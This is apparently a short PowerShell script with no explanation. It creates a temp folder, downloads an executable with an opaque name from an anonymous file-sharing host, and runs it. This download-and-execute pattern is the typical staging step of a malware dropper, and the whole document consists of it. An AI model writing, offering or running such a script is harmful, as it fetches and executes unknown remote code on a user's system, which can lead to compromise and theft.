mkdir C:\tmp
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest https://dl.uploadgram.me/62748f8145fe2h?raw -OutFile C:\tmp\new.exe
cd C:\tmp
cmd.exe /c "C:\tmp\new.exe"
exit


